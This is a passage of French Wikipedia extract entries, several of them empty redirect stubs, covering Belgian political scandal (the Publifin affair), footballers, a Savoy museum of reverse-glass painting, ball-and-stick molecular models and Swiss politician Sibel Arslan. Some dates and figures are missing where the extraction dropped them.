Il est à nouveau incarcéré en à la prison de Perpignan, pour ne pas avoir respecté son suivi socio-judiciaire. Le , il est remis en liberté.
Pour approfondir.
Documentaires.
La chaîne de télévision C8 diffuse, à quelques mois d'intervalle, deux documentaires consacrés à Christian Quesada : "Du rêve au cauchemar : le point sur l'affaire", le , puis "Christian Quesada : nouvelles révélations sur le champion déchu", le . W9 a aussi fait un documentaire, "Christian Quesada : des studios télé à la prison, que s'est-il vraiment passé ?" en 2021. Le 27 octobre 2022, C8 diffuse le documentaire "Christian Quesada sort du silence" (quelques jours après son nouveau séjour d'un mois en prison).

</doc>
<doc id="10579383" url="https://fr.wikipedia.org/wiki?curid=10579383" title="Jacques Babou de La Bourdaisière">
Jacques Babou de La Bourdaisière



</doc>
<doc id="10579385" url="https://fr.wikipedia.org/wiki?curid=10579385" title="Fabrice Babou de La Bourdaisière">
Fabrice Babou de La Bourdaisière



</doc>
<doc id="10579387" url="https://fr.wikipedia.org/wiki?curid=10579387" title="Françoise Babou de La Bourdaisière">
Françoise Babou de La Bourdaisière



</doc>
<doc id="10579399" url="https://fr.wikipedia.org/wiki?curid=10579399" title="Benjamin Zé Ondo">
Benjamin Zé Ondo

Benjamin Zé Ondo (né le au Gabon) est un joueur de football international gabonais, qui évolue au poste de milieu gauche.
Il évolue avec le club de Mosta.
Biographie.
Carrière en club.
Benjamin Zé Ondo joue 14 matchs en première division algérienne, et 14 matchs en première division marocaine.
Il participe avec le club algérien de l'ES Sétif, à la Ligue des champions d'Afrique. Lors de cette compétition, il inscrit un but contre l'équipe tunisienne du Club sportif sfaxien en août 2014. Il remporte cette compétition quelques mois plus tard avec Sétif, en battant le club congolais de l'AS Vita Club en finale.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Gabon le 9 février 2011, en amical contre la RD Congo (défaite 2-0).
Il participe avec le Gabon à la Coupe d'Afrique des nations en 2015 et en 2017.

</doc>
<doc id="10579402" url="https://fr.wikipedia.org/wiki?curid=10579402" title="Gianotti">
Gianotti



</doc>
<doc id="10579411" url="https://fr.wikipedia.org/wiki?curid=10579411" title="Ronaldo (football, 1962)">
Ronaldo (football, 1962)

Ronaldo Moraes da Silva, abrégé en Ronaldo, est un footballeur brésilien né le à Guarujá. Il évoluait au poste de défenseur.
Biographie.
En club.
Ronaldo joue au Brésil, notamment avec les clubs du SC Corinthians et du Grêmio.
En équipe nationale.
Il est médaillé d'argent avec le Brésil lors des Jeux olympiques d'été de 1984. Il dispute l'intégralité des matchs lors du tournoi olympique, et marque un but contre l'Italie en demi-finale.
Palmarès.
"Avec le Brésil :"

</doc>
<doc id="10579412" url="https://fr.wikipedia.org/wiki?curid=10579412" title="Ronaldo Morais Silva">
Ronaldo Morais Silva



</doc>
<doc id="10579413" url="https://fr.wikipedia.org/wiki?curid=10579413" title="Ronaldo Moraes da Silva">
Ronaldo Moraes da Silva



</doc>
<doc id="10579414" url="https://fr.wikipedia.org/wiki?curid=10579414" title="Ronaldo Moraes Silva">
Ronaldo Moraes Silva



</doc>
<doc id="10579421" url="https://fr.wikipedia.org/wiki?curid=10579421" title="Musée du Revard">
Musée du Revard

Le musée du Revard est un musée français situé sur le mont Revard en Savoie. Il est le seul musée français consacré à l'art de la peinture sur verre inversé ou fixé sous verre. Il a ouvert ses portes en . Si d'autres musées dans le Monde sont consacrés à la peinture sous verre (musée de Romont en Suisse, musée de Hlebine en Croatie, musée de Sibiel en Roumanie), le musée du Revard est le seul à offrir un panorama de cette technique au niveau mondial et sur trois siècles.
Le bâtiment.
Le musée du Fixé est installé au rez-de-chaussée de l’ancien Grand Hôtel, construit en 1894, qui servait de destination aux touristes fortunés de la Belle Époque utilisant les services du PLM (Paris Lyon Méditerranée).
La collection permanente.
Le musée expose plus de 400 œuvres et offre un panorama complet du fixé sous verre, avec notamment:
Le musée présente également les grands noms de la création contemporaine française : Anne Boille, Chanath, Marie-Amalia Bartolini, Erika Sellier, Didier Merlin et Michel Houvet.
En outre des documents originaux sur le Revard (affiches, prospectus...) ou provenant de personnalités ayant fréquenté la station (Joseph Kessel, Vincent d'Indy...) ou originaires d'Aix-les-Bains ou des Déserts (Léon Brunschvicg, Daniel-Rops, Adrienne Monnier), sans oublier une lettre manuscrite émouvante de Lamartine sont exposés dans le lobby actuellement occupé par le salon de thé attenant qui expose aussi les photos en très grand format de René Claude : "le Revard à couper le souffle".
Les expositions temporaires.
Le musée organise deux expositions temporaires par an, prioritairement consacrées au Revard et à la Savoie.
En 2017, la première avait réuni des éléments autour de l’histoire de l’urbanisation et des sports d’hiver au début du , avec le concours de la Mairie d'Aix-les-Bains ainsi que des photos en très grand format de René Claude.
En 2018, ont été proposées deux expositions thématiques autour des « migrants » avec des peintures sous verre de Didier Merlin, et de « guerre et amour », avec des peintures sous verre de Chanath, et des toiles de Anne Cindric-Paris présentent le nouveau visage de la peinture sous verre.
L’hiver 2019 est consacré à une mise en tension avec, d’une part, des œuvres de Didier Merlin et des objets culturels, artistiques..., de l'eldorado européen, tel qu'il est perceptible dans l’imaginaire et les yeux des migrants - peints par Didier Merlin.
À l’été 2019 a eu lieu une exposition qui met en vis-à-vis la grande libraire-éditrice de la commune voisine des Déserts Adrienne Monnier et son double algérois, Edmond Charlot, premier éditeur de Camus ; l’ensemble est illustré par 14 fixés sous verre de Chanath.
Par ailleurs le musée du Revard a été en 2018 commissaire d'exposition d'un événement à Chênes-Bougeries (canton de Genève) : Peinture sous verre, naïve ou inspirée ?
L’été 2020 verra se confronter les œuvres de Michel Houvet, artiste méditant, et Ulrich Stückelberger, peintre reconnu, autour de la thématique : « au delà de l’image », face aux productions d’un artiste renommé et inconnu, Decbel
Philosophie de la peinture sous verre.
À partir d'une particularité technique simple (peindre sur le verre à l'envers) toute une série de spécificités du statut ou de la fonction de l'art se révèlent : d'une fragilité inévitable, la peinture sous verre ne constitue pas un rempart contre le temps. Peinture largement communautaire, les artistes signent rarement leurs œuvres, ce qui met cette technique en dehors de l'histoire de l'art officielle. Les détails étant peints dès le départ car ils seront recouverts ensuite, les repentirs et modifications sont interdites : le pacte multiséculaire de l'artiste et de la liberté est écorné, puisqu'il faut d'une certaine manière suivre un plan d'exécution...

</doc>
<doc id="10579423" url="https://fr.wikipedia.org/wiki?curid=10579423" title="Francisco Jesuíno Avanzi">
Francisco Jesuíno Avanzi



</doc>
<doc id="10579428" url="https://fr.wikipedia.org/wiki?curid=10579428" title="Vittoria Di Silverio">
Vittoria Di Silverio

Maria Vittoria Ghirighini, connue sous le nom de scène Vittoria Di Silverio est une actrice italienne.

</doc>
<doc id="10579465" url="https://fr.wikipedia.org/wiki?curid=10579465" title="Cloître de la Stella">
Cloître de la Stella

Le cloître du couvent Santa Maria della Stella (Sainte-Marie-de-l'Étoile) est un cloître appartenant au couvent Santa Maria della Stella de Naples dans le quartier de Stella.
Histoire.
Le cloître et son couvent sont construits au par Camillo Fontana sur ordre des Pères minimes. En réalité, c'est le peuple des habitants du quartier de la porte Saint-Janvier qui avait demandé la construction de ce couvent dédié à la Vierge de l'Étoile pour y abriter l'image de cette Vierge qui se trouvait dans un édicule qu'il avait fallu démolir en agrandissant les remparts voulus par le .
Les minimes vécurent dans leur couvent jusqu'au , date à laquelle ils furent expulsés par le nouveau royaume d'Italie. Une partie du cloître fut démolie pour aménager une caserne de carabiniers qui occupe encore aujourd'hui l'ancien couvent.
De la construction originale, il ne reste que deux côtés soutenus par des piliers surmontés d'arcs en piperno avec des fresques encore bien conservées. La margelle du puits de marbre est d'étonnante facture ; de forme triangulaire, et de fer battu, elle s'élève avec une étoile en son sommet.

</doc>
<doc id="10579479" url="https://fr.wikipedia.org/wiki?curid=10579479" title="Modèle moléculaire boules-bâtonnets">
Modèle moléculaire boules-bâtonnets

En chimie, un modèle moléculaire boules-bâtonnets est un modèle moléculaire d'une substance chimique qui permet la visualisation en trois dimensions de la position de ses atomes et des liaisons chimiques qui les unissent. Les atomes sont généralement représentés par des boules, reliées entre elles par des bâtonnets (et parfois des ressorts) qui représentent les liaisons chimiques. Les liaisons doubles ou triples sont habituellement représentées par deux ou trois tiges courbées, respectivement. Dans un bon modèle, les angles entre les bâtonnets doivent être les mêmes que les angles entre les liaisons chimiques, et les distances entre les centres des sphères doivent être proportionnelles à celles entre les noyaux atomiques correspondants. La couleur des boules utilisées suit une convention qui permet d'identifier l'élément chimique qu'elles représentent.
Dans un modèle moléculaire boules-bâtonnets, le rayon des boules est généralement inférieur à la longueur des bâtonnets afin de fournir une vue plus claire des atomes et liaisons. Par conséquent, le modèle donne une idée généralement fausse de l'espace occupé par les atomes. Par comparaison, le modèle dit « compact » fait en sorte que les rayons des boules sont proportionnels aux rayons atomiques et respectent l'échelle des distances entre atomes. Le modèle compact montre ainsi l'espace occupé par les atomes de la molécule, mais pas les liaisons.
Les modèles boules-bâtonnets peuvent être des objets physiques que l'on peut manipuler ou encore des modèles informatiques. Les premiers sont généralement construits à partir de kits de modélisation moléculaire, comprenant typiquement des ressorts ou des bâtonnets souples en plastique et des boules en plastique percées de quelques trous. La couleur des sphères suit généralement le code de couleurs CPK. Ce dernier assigne par exemple le blanc à l'hydrogène, et le noir au carbone.
Historique.
En 1865, le chimiste allemand August Wilhelm von Hofmann est le premier à utiliser les modèles utilisant des boules et des bâtonnets. Lors d'une des fameuses "Friday Evening Discourses" (« Conférences du vendredi soir ») à la Royal Institution of Great Britain, le , il présente "The Combining Power of Atoms" (« Le pouvoir combinatoire des atomes »). Durant sa présentation, il illustre la combinaison des atomes en molécules à l'aide de boules de croquet liées par des tiges. Il dit notamment au cours de la conférence :
Des sociétés sont spécialisées dans la fabrication de ces modèles. L'une des premières a été Woosters, basée à Bottisham dans le Cambridgeshire anglais. Les boules fabriquées étaient percées de trous permettant des structures tétraédriques, rhomboédriques et octaédriques. De plus, il y avait des boules avec 24 trous, permettant une flexibilité encore plus grande. Ces modèles permettaient aux boules de pivoter autour des bâtonnets, ce qui avait l'avantage de montrer la flexibilité moléculaire, au prix d'une certaine mollesse des modèles assemblés. L'échelle approximative était de (soit ou un ratio de :1), sans pour autant être homogène pour tous les éléments. 
La société édimbourgeoise Beevers Miniature Models produisait de petits modèles utilisant des boules en PMMA et des bâtonnets en acier inoxydable. Ces éléments, fabriqués avec précision, permettaient l'assemblage de modèles à la fois justes, légers et rigides.

</doc>
<doc id="10579485" url="https://fr.wikipedia.org/wiki?curid=10579485" title="Jovica Nikolić">
Jovica Nikolić

Jovica Nikolić est un footballeur serbe né le à Svetozarevo. Il évoluait au poste de milieu de terrain.
Biographie.
En club.
Il joue notamment à l'Étoile rouge de Belgrade de 1983 à 1989. Il évolue au Portugal à la fin de sa carrière : le SC Salgueiros de 1989 à 1993 et le FC Maia de 1993 à 1995.
Il dispute un total de 86 matchs en première division yougoslave, inscrivant 12 buts, et 92 matchs en première division portugaise, marquant 10 buts. Il réalise sa meilleure performance lors de la saison 1983-1984, où il inscrit huit buts.
Il participe également aux compétitions européennes, disputant six matchs en Ligue des champions, quatre matchs en Coupe de l'UEFA, et cinq matchs en Coupe des coupes. Il inscrit son seul but en Coupe d'Europe le , lors du deuxième tour de la Coupe des coupes contre l'Étoile rouge de Belgrade (victoire 3-1).
Il remporte au cours de sa carrière deux titres de champion de Yougoslavie et une Coupe de Yougoslavie.
En équipe nationale.
Jovica Nikolić participe aux Jeux olympiques d'été de 1984 avec la Yougoslavie, qui se classera troisième du tournoi. Il joue cinq matchs lors du tournoi olympique, inscrivant trois buts.
International yougoslave, il reçoit une unique sélection en équipe de Yougoslavie le , contre l'Allemagne de l'Est (défaite 1-2). Ce match rentre dans le cadre des qualifications pour la Coupe du monde 1986.
Palmarès.
"Avec l'Étoile rouge :"
"Avec Salgueiros :"
"Avec la Yougoslavie :"

</doc>
<doc id="10579487" url="https://fr.wikipedia.org/wiki?curid=10579487" title="Jovica Nikolic">
Jovica Nikolic



</doc>
<doc id="10579492" url="https://fr.wikipedia.org/wiki?curid=10579492" title="Tour Malakoff (Sermizelles)">
Tour Malakoff (Sermizelles)

La tour Malakoff est une tour octogonale crénelée, située sur une hauteur qui domine le village de Sermizelles, en France. Cet édifice est inscrit au titre des monuments historiques depuis 2012.
Historique.
Elle fut bâtie en 1858 à l'initiative du curé de Sermizelles, l'abbé Plagnard. Il voulait honorer et remercier la Vierge Marie, pour avoir veillé sur les enfants de la commune qui faisaient partie des troupes françaises engagées dans la guerre de Crimée, en particulier dans la prise de la tour Malakoff et du siège de Sébastopol en 1854.
L’architecte est Jean-Baptiste Mathieu de Clamecy. La tour mesure 8,50 m de haut, elle est en pierre de Domecy et de Coutarnoux. Dans le bas de la tour fut installé un petit oratoire.
La tour est surmontée d'une statue de la Vierge Marie. D’une hauteur de 2,50 m, elle a été sculptée dans la pierre de Cravant.
Le lieu fut l'objet de grands pèlerinages depuis le village, par le sentier en lacets. Après une longue période d'oubli, les processions reprirent dans l'après-guerre, à partir de 1949.

</doc>
<doc id="10579505" url="https://fr.wikipedia.org/wiki?curid=10579505" title="Modélisation boule-bâton">
Modélisation boule-bâton



</doc>
<doc id="10579506" url="https://fr.wikipedia.org/wiki?curid=10579506" title="Boule-bâton (modélisation)">
Boule-bâton (modélisation)



</doc>
<doc id="10579510" url="https://fr.wikipedia.org/wiki?curid=10579510" title="Boule et bâton (modèle)">
Boule et bâton (modèle)



</doc>
<doc id="10579551" url="https://fr.wikipedia.org/wiki?curid=10579551" title="Affaire Publifin">
Affaire Publifin

L'affaire Publifin, du nom de l'intercommunale Publifin (dénommée Tecteo jusqu'en ; Enodia depuis 2018), est un scandale politico-financier wallon ayant éclaté le à la suite des révélations du magazine "Le Vif/L'Express".
Chronologie de l'affaire.
Révélations du "Vif/L'Express".
Le , se basant sur des informations récoltées par Cédric Halin, échevin des Finances de la commune d'Olne, le magazine "Le Vif/L'Express" révèle que plusieurs mandataires politiques locaux, membres du PS, du MR, du cdH et essentiellement originaires de la province de Liège, perçoivent d'importantes rémunérations de Publifin, alors que certains n'assistent pas ou peu aux réunions des comités de secteur ou de sous-secteur de l'intercommunale. Ces organes consultatifs sont supprimés par le conseil d'administration le . Le parquet de Liège, suspectant la commission de faux, l'usage de ces faux et des abus de biens sociaux au préjudice de l'intercommunale, ouvre une information judiciaire quelques jours après. Le procureur-général Christian De Valkeneer supervise la procédure en raison des liens familiaux existant entre le procureur du Roi Philippe Dulieu et Stéphane Moreau, l'administrateur-délégué de Nethys SA, l'entité opérationnelle de Publifin.
Le , le quotidien économique et financier "L'Écho" révèle que le montant du salaire de Daniel Weekers, directeur de la stratégie de Nethys, s'élèverait à par an (hors avantages) et serait payé par l'entremise d'une société pour des raisons d'optimisation fiscale. Stéphane Moreau serait rémunéré à hauteur de bruts par an, selon "Le Vif".
Motion de méfiance et démission de Paul Furlan.
Le , le MR demande la démission de Paul Furlan, ministre des Pouvoirs locaux, pour les propos qu'il a tenus dans le journal "L'Avenir". Pierre-Yves Jeholet (MR) reproche au ministre d'avoir toujours refusé un cadastre des mandats dans les organismes publics wallons. À ce stade, le président du PS Elio Di Rupo exclut tout pas de côté de la part de Paul Furlan. Le , en séance plénière du Parlement wallon, le député écologiste Stéphane Hazée réclame à son tour la démission du ministre à la suite des révélations concernant son chef de cabinet adjoint, le bourgmestre de Wanze, Claude Parmentier. Ce dernier percevait, en tant qu'administrateur de Nethys SA, d'importants émoluments depuis 2013.
Les deux partis d'opposition MR et Ecolo finissent par déposer ensemble une motion de méfiance contre le gouvernement Magnette, visant dans ce texte le ministre des Pouvoirs locaux. Au même moment, plusieurs articles de presse se montrent assez critiques envers la composition de son cabinet, si bien que le cdH réclame des explications au ministre « dans les plus brefs délais ».
Contesté par l'opposition et critiqué par la presse, Paul Furlan se résigne à démissionner le .
L'éphémère « commission spéciale » du Parlement wallon.
Le , une commission spéciale « chargée d'examiner la transparence et le fonctionnement du Groupe Publifin » est installée au Parlement de Wallonie. Tous les partis représentés au Parlement y siègent.
Le lendemain après-midi, le socialiste André Gilles, député provincial et président de Publifin, est entendu par la commission. André Gilles affirme qu'on leur a imposé la mise en place des comités de secteur, dont les rémunérations excessives sont au cœur de la polémique. Cela répondait, selon lui, à la nécessité des anciennes intercommunales (qui ont fusionné pour former Publifin) de continuer à vérifier les activités du groupe. Gilles souligne également que l'« on peut après coup juger que [le montant des rémunérations] était trop élevé et qu'on aurait dû lier ça à la présence, mais [que] la loi était imprécise ».
Durant ces six heures d'audition, le président de Publifin élude cependant de nombreuses questions embarrassantes, notamment sur le montant des dirigeants des filiales privées de Nethys. Trois jours plus tard, la grande quantité de documents transmis par Publifin à la commission spéciale ne permet toujours pas de répondre à ces questions. Par conséquent, les partis de la majorité PS et cdH finissent par accepter l'installation d'une véritable commission d'enquête parlementaire, demandée depuis plusieurs semaines par l'opposition. Une telle commission d'enquête n'avait plus été mise sur pied par le Parlement wallon depuis 1992.
En attendant la conclusion des travaux de la commission, les socialistes André Gilles et Stéphane Moreau sont suspendus de leurs mandats internes au PS.
Nouvelles révélations sur des filiales de Publifin.
Le , la radio-télévision privée RTL révèle que des filiales détenues majoritairement (SOCOFE et Publipart) ou non (EDF Luminus) par Publifin rétribuent chèrement plusieurs mandataires politiques. La presse flamande s'empare de l'affaire et montre que la société anonyme Publipart, qui investirait notamment dans l'armement chimique, a versé des montants importants à 17 administrateurs. Parmi ceux-ci figurent deux échevins gantois, (Open VLD) et le futur candidat bourgmestre, (sp.a). Le lendemain, ce dernier démissionne de son mandat à la ville de Gand et renonce à se présenter en tête de liste aux prochaines élections communales.
Le , le bourgmestre socialiste de Seraing Alain Mathot annonce lors d'un conseil communal qu'il a démissionné de ses mandats au sein de Publilec (qui chapeaute Publipart), de la SOCOFE et d'EDF Luminus. Il a également renoncé à son mandat au sein de NeWIN, pour lequel il était rémunéré via une société de management. Selon le quotidien "Le Soir", ces différents mandats lui ont rapporté environ euros en 2015.
La « commission d'enquête parlementaire ».
Composition.
La commission d'enquête parlementaire « chargée d'examiner la transparence et le fonctionnement du Groupe Publifin » (ou « commission Publifin ») est installée le , sous la présidence de la socialiste Olga Zrihen. Les trois groupes parlementaires (PS, MR, et cdH) participent à cette commission, de même qu'un représentant de chaque petit parti de l'opposition (Ecolo, PTB et J'existe). Ces trois derniers partis assistent à toutes les réunions, mais leur voix est consultative.
Perquisitions.
Le 9 mars, la commission Publifin ordonne des perquisitions au sein de l'intercommunale sur la base d'un "" transmis par le procureur général de Liège Christian De Valkeneer. Selon des révélations anonymes, André Gilles et Stéphane Moreau auraient demandé, le 22 février, à des membres du personnel de Nethys de réaliser ou de détruire des documents demandés par la commission d'enquête. La direction de Nethys dément formellement ces accusations.
Rapport intermédiaire.
Les membres de la commission Olga Zrihen, Patrick Prévot (PS), Jean-Luc Crucke (MR), Dimitri Fourny (cdH) et Stéphane Hazée (Ecolo) présentent leur rapport intermédiaire à la presse le 11 mai. Ils y formulent plusieurs recommandations, parmi lesquelles le renouvellement intégral du conseil d'administration et du comité de direction du groupe Publifin-Nethys (avec pour conséquence le départ de Stéphane Moreau). En ce qui concerne les rémunérations, la commission réclame notamment le remboursement à l'intercommunale des montants attribués au sein des « comités de secteur » et la limitation du plafond des rémunérations des dirigeants du groupe à euros. Le rapport insiste également sur la nécessité de renforcer le contrôle de la Région wallonne sur l'intercommunale. Enfin, la position du gestionnaire du réseau de distribution (GRD) Resa au sein de la SA Nethys (et non directement dans l'intercommunale Publifin) pose problème.
Pressions du groupe Publifin-Nethys sur la commission.
Début avril, l'hebdomadaire "Le Vif/L'Express" révèle l'existence d'un courrier adressé à la présidente Olga Zrihen par les avocats de Nethys SA, le cabinet Linklaters et Adrien Masset. Ces derniers soulignent l'absence de fondement légal dans la saisie de documents lors de la perquisition du 9 mars. Les avocats de Nethys critiquent également le comportement agressif des commissaires à l'égard de certains témoins. Dans un courrier ultérieur, ces mêmes avocats exigent une relecture du rapport intermédiaire de la commission Publifin : selon eux, les droits de la défense ne seraient pas garantis. La présidente de la commission rétorque que les commissaires n'ont pas d'ordre à recevoir de l'extérieur et qu'ils continueront leur travail comme avant.
La pression s’accentue sur la commission lorsque Nethys décide d'assigner en justice cinq députés (Zrihen, Prévot, Crucke, Fourny et Hazée) devant le tribunal de première instance de Namur. Les avocats de Nethys reprochent à ces députés d'avoir enfreint les droits de la défense à travers certaines déclarations, en commission ou dans les médias. Selon eux, il s'agit de calomnie, d'atteintes à l'honneur et à la présomption d'innocence. Nethys réclame par conséquent euros de dédommagement aux cinq parlementaires qu'elle a cités à comparaître devant le tribunal civil.
Réuni en urgence, le 22 mai, en séance plénière, le Parlement de Wallonie approuve à l'unanimité une proposition de résolution relative à une « intervention volontaire dans le cadre de l’action civile mise en œuvre par la S.A. Nethys » contre les parlementaires cités devant le tribunal le lendemain. Par cette initiative, le Parlement dans son entièreté se joint à la cause en s'impliquant dans la procédure devant le tribunal civil :
Rapport final et procès-verbal adressé au procureur général.
Le , les députés Zrihen, Prévot, Crucke, Fourny et Hazée rendent publiques les dernières recommandations de la commission. Le rapport final de la commission est présenté au Parlement wallon le 6 juillet par les députés Gilles Mouyard (MR), Pascal Baurain (cdH) et Bruno Lefebvre (PS).
Dans un procès-verbal adressé au procureur général de Liège, la commission relève quinze indices, qui sont « susceptibles d'être constitutifs d'une ou plusieurs infractions » pénales commises par des membres de la direction, des organes de gestion et/ou des comités de secteur au sein de Publifin-Nethys : prise d'intérêt, concussion sans violences ni menaces, abus de confiance, abus de biens sociaux et recel d'abus de biens sociaux.
Pressions du groupe Nethys sur le quotidien "L'Avenir".
Selon "Le Vif/L'Express" du , le journal "L'Avenir" a subi diverses pressions rédactionnelles de la part du groupe Nethys, propriétaire du quotidien.
Le , des représentants de quatre partis représentés au Parlement de Wallonie (cdH, Écolo, MR et PS) publient un communiqué soutenant la liberté de la presse.
Conséquences de l'affaire.
Démissions multiples.
Claude Emonts, conseiller communal socialiste à Liège, annonce le qu'il abandonne tous ses mandats. Le bourgmestre d'Engis, Serge Manzato, quitte la présidence de la fédération socialiste de Huy-Waremme. Le même jour, la libérale Virginie Defrang-Firket, conseillère communale à Neupré et députée wallonne, quitte la vice-présidence du conseil d'administration et du bureau exécutif de Publifin.
Claude Parmentier, bourgmestre de Wanze et membre des conseils d'administration de Publifin et de Nethys, démissionne de son poste de chef de cabinet adjoint du ministre wallon des Pouvoirs locaux, Paul Furlan, le . Il démissionne ensuite des conseils d'administration de Nethys et du fonds de pension Ogeo Fund.
Le vice-président de Nethys et ancien vice-président de Publifin, le conseiller provincial liégeois Dominique Drion, démissionne le lendemain du comité de déontologie, d'éthique et d'arbitrage du cdH. Un autre membre de ce parti, Didier Hamers, conseiller communal à Dison, remet le ses mandats d'administrateurs et de vice-président de Publifin. Le , Raphaël Amieva Acebo, conseiller communal cdH à Crisnée, renonce à son poste d'administrateur de Publifin. Le , Benoît Lutgen, président du cdH, annonce la démission des quatre administrateurs — Raphaël Amieva, Dominique Drion, Didier Hamers et Vinciane Pirmolin — représentant le parti au sein de Publifin et leur remplacement notamment par Cédric Halin, l'échevin des Finances cdH d'Olne à l'origine des révélations du "Vif".
Contesté par l'opposition depuis plusieurs semaines, Paul Furlan, le ministre wallon des Pouvoirs locaux, démissionne le .
Stéphane Moreau quitte son poste de bourgmestre d'Ans le .
Le , Georges Pire (MR), réputé pour avoir cumulé de nombreux mandats et régulièrement cité dans l'affaire Publifin, annonce qu'il démissionne de son mandat de conseiller provincial.
Le , André Gilles (PS) annonce qu'il quitte la présidence de l'intercommunale Publifin et du collège provincial liégeois à la fin du mois.
Le , le bourgmestre de Liège Willy Demeyer annonce sa démission du poste de président de la fédération liégeoise du PS et souhaite remettre son mandat de député fédéral. Il dit accepter « d'endosser une part de responsabilité » dans cette affaire. Dans la foulée, les socialistes liégeois Isabelle Simonis, Frédéric Daerden et Alain Mathot remettent spontanément leur mandat fédéral.
Gilles et Moreau exclus du Parti socialiste.
Le , le PS annonce par communiqué de presse la décision de la Commission de vigilance du parti d'exclure immédiatement André Gilles. Anticipant une probable exclusion de son parti, Stéphane Moreau annonce le qu'il quitte le PS. Le lendemain, la Commission de vigilance socialiste confirme son exclusion définitive du PS.
Rupture des coalitions régionales et communautaire.
À la suite des affaires Publifin et du Samusocial, Benoît Lutgen rompt le les coalitions régionales et communautaire entre le Centre démocrate humaniste et le Parti socialiste. En Wallonie, le gouvernement Borsus (centre droit) entre en fonction après le vote de la motion de défiance constructive déposée contre le gouvernement Magnette, le . Sur exprimés, la motion de défiance est adoptée par « pour » et « contre ». Pour la première fois depuis 1988, le PS se retrouve dans l'opposition en Région wallonne.
Réactions de la classe politique et de la société civile.
Le , le politologue François Gemenne, professeur à l'université de Liège, dénonce dans le journal de la mi-journée de La Une un et affirme que les démissions qui ont eu lieu ne sont que celles de . L'intercommunale annonce le jour-même qu'elle porte plainte au pénal pour calomnie et diffamation. En réponse à la menace de porter plainte de Nethys, le politologue indique qu'il , faisant référence à l'assassinat d'André Cools en 1991. François Gemenne et Éric Jadot, ancien député écologiste, lancent le une « pétition citoyenne » afin, notamment, qu'une commission d'enquête parlementaire soit créée.
Un autre politologue, Michel Hermans, interrogé par "L'Avenir", ne partage pas l'analyse de François Gemenne quant à la nature mafieuse du système Publifin : Il juge cependant que l'affaire bénéficiera électoralement au Parti du travail de Belgique (PTB) au détriment du PS.
Laurette Onkelinx, cheffe du groupe socialiste à la Chambre des représentants, déclare à la VRT le , à propos de Stéphane Moreau, le bourgmestre d'Ans et concepteur du système Publifin : 
Paul Magnette, le ministre-président wallon, déclare qu'il va s'occuper personnellement du dossier et qu'il va élaborer des Il ajoute qu', un jeu à gratter de la Loterie nationale.
Réactions liégeoises.
Jean-Claude Marcourt, vice-président du Gouvernement wallon, estimant que « l'on doit clarifier les règles mais pour tous » juge « inappropriée » la proposition de Laurette Onkelinx. Le journal "Le Soir" parle d'un « réflexe d'autodéfense » dans la fédération liégeoise du PS et recueille les déclarations d'une personnalité socialiste proche des entreprises mises en cause pour leur éthique qui pense que les pratiques mises en cause à Liège existent dans d'autres secteurs : Dans la même ligne le journal "La Meuse" parle de quatre enjeux « anti-liégeois » qui selon lui seraient dissimulés derrière l'affaire : la jalousie d'autres communes wallonnes et francophones de voir les seules communes liégeoises bénéficier des dividendes du rachat par l'ancêtre de Publifin (ALE-Teledis) de leur réseau lors de la privatisation du câble il y a pour maintenir l'activité en Wallonie (et contrer l'offre concurrente de la société Telenet, société flamande) ; l'opposition exacerbée entre le PS liégeois et celui du Hainaut ; l'avenir économique de l'assureur Ethias que, dit le journal, « le gouvernement fédéral voudrait revendre au privé pour des raisons dogmatiques » (avec les emplois localisés à Liège). Il y a, toujours selon la même source, le fait que François Gemenne en parlant de mafia, a permis à la presse flamande de « rappeler que l'État PS wallon était infréquentable ».

</doc>
<doc id="10579552" url="https://fr.wikipedia.org/wiki?curid=10579552" title="Scandale Publifin">
Scandale Publifin



</doc>
<doc id="10579553" url="https://fr.wikipedia.org/wiki?curid=10579553" title="Thomas Harding">
Thomas Harding

Thomas Harding peut faire référence à :

</doc>
<doc id="10579561" url="https://fr.wikipedia.org/wiki?curid=10579561" title="George Robertson">
George Robertson

George Robertson peut faire référence à :

</doc>
<doc id="10579567" url="https://fr.wikipedia.org/wiki?curid=10579567" title="Lubna Olayan">
Lubna Olayan

Née en 1955, Lubna Olayan est une femme d'affaires saoudienne.
Olayan Group.
Elle succède en 2002 à son défunt père, Sulaiman Olayan,et devient PDG du conglomérat Olayan Group.
Prix et reconnaissances.
En 2014, elle est parmi les femmes les plus influentes au monde selon un classement de Forbes.

</doc>
<doc id="10579570" url="https://fr.wikipedia.org/wiki?curid=10579570" title="William Black">
William Black

William Black peut faire référence à :

</doc>
<doc id="10579573" url="https://fr.wikipedia.org/wiki?curid=10579573" title="Sibel Arslan">
Sibel Arslan

Sibel Arslan, née le à Erzincan en Turquie (originaire de Bâle, binationale turco-suisse), est une avocate et femme politique suisse, membre de BastAǃ. 
Elle est députée du canton de Bâle-Ville au Conseil national depuis novembre 2015.
Biographie.
Sibel Arslan arrive en Suisse en 1991 avec sa mère et deux frères. Son père y avait immigré six ans plus tôt en tant que réfugié et y travaillait comme serveur.
Après le gymnase, elle étudie le droit à l'Université de Bâle et y obtient une licence. Elle gère avec son frère à partir de 2006 le bar à shisha "Susam" sur la Barfüsserplatz à Bâle.
Parcours politique.
Elle est naturalisée (binationale turco-suisse) en . La même année, elle adhère au parti BastAǃ. Elle est élue un an plus tard au Grand Conseil du canton de Bâle-Ville, où elle siège jusqu'en au sein du groupe de l'. À partir de , elle siège au sein de la Commission de la justice, de la sécurité et du sport puis à partir de , au sein de la Commission des grâces.
Lors des élections fédérales suisses de 2015, elle est élue au Conseil national. Elle est la première élue d’origine kurde à y accéder. Elle y est membre du groupe parlementaire des Verts et siège au sein de la Commission des affaires juridiques (CAJ), de la Commission de politique extérieure (CPE) et de la Commission judiciaire (CJ). Elle est l'un des six vice-présidents des Verts suisses depuis juin 2022. Elle est réélue en 2019 et 2023.
En , alors que la Place fédérale est occupée par des manifestants climatiques, une altercation médiatisée l'oppose au conseiller national Andreas Glarner, qui lui assène, en écorchant son nom, qu'elle n'a pas connu le respect de l'ordre public dans son pays ("Das ist Recht und Ordnung, Frau Arschlan! Das hat es in deinem Staat nicht gegeben!"). Filmée, la scène provoque un tollé. Sibel Arslan dépose plainte contre Andreas Glarner en pour usurpation d'identité en ligne après que celui-ci a publié juste avant les élections fédérales d'octobre 2023 une fausse vidéo hyperréaliste où elle appelait à voter pour l'UDC et à renvoyer les criminels turcs.

</doc>
<doc id="10579577" url="https://fr.wikipedia.org/wiki?curid=10579577" title="Basels starke Alternative">
Basels starke Alternative

Basels starke Alternative, en abrégé BastAǃ, est un parti politique écologiste de gauche dans le canton suisse de Bâle-Ville.
Histoire.
